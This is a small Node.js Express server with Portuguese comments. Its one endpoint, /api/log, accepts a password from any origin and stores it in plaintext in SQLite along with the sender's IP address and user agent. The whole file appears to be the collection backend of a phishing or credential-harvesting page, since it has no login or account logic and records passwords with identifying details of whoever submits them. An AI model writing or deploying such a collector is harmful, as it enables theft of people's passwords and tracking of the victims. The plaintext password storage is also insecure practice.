const express = require("express");
const cors = require("cors");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const PORT = 3000;

app.use(cors());
app.use(express.json());

// Banco SQLite
const db = new sqlite3.Database("./database.db");

// Criar tabela
db.run(`
  CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    password TEXT,
    ip TEXT,
    user_agent TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  )
`);

// Rota para salvar dados
app.post("/api/log", (req, res) => {
  const { password } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"];

  if (!password) {
    return res.status(400).json({ error: "Senha vazia" });
  }

  db.run(
    `INSERT INTO logs (password, ip, user_agent) VALUES (?, ?, ?)`,
    [password, ip, userAgent],
    (err) => {
      if (err) {
        console.error(err);
        return res.status(500).json({ error: "Erro no banco" });
      }
      res.json({ success: true });
    }
  );
});

app.listen(PORT, () => {
  console.log(`✅ Backend rodando em http://localhost:${PORT}`);
});
